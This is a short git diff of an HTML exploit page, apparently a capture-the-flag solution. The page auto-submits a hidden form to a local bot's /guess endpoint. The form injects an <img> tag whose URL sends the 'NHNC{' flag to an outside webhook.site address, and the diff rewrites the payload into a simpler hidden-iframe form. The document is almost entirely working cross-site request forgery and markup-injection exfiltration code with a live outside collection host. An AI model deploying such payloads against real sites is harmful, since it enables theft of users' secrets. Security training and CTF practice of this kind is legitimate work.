@@ -1,35 +1,11 @@
+<iframe name="hidden_frame" style="display:none;"></iframe>
+<form id="e" action="http://127.0.0.1:5000/guess" method="POST" target="hidden_frame">
+  <input type="hidden" name="guess" value="NHNC{" />
+  <input type="hidden" name="note" value='<img src="http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?flag=NHNC{">' />
+</form>
 <script>
-window.onload = function() {
-  const newWindow = window.open('', '_blank');
-  if (!newWindow) {
-    console.error('❌ Bot không cho phép mở tab mới');
-    return;
-  }
-
-  const form = document.createElement('form');
-  form.method = 'POST';
-  form.action = 'http://127.0.0.1:5000/guess';
-  form.target = newWindow.name;
-
-  const guess = document.createElement('input');
-  guess.type = 'hidden';
-  guess.name = 'guess';
-  guess.value = 'NHNC{';
-
-  const note = document.createElement('input');
-  note.type = 'hidden';
-  note.name = 'note';
-  note.value = '<img src="http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?flag=NHNC{">';
-
-  form.appendChild(guess);
-  form.appendChild(note);
-
-  document.body.appendChild(form); // ← CHỖ NÀY PHẢI CHẠY SAU KHI DOM SẴN SÀNG
-  form.submit();
-
+  document.getElementById('e').submit();
   setTimeout(() => {
-    window.location = 'http://127.0.0.1:5000/';
-  }, 500);
-};
+    window.location = "http://127.0.0.1:5000/";  // để trigger lại loadStatus()
+  }, 800);
 </script>
-
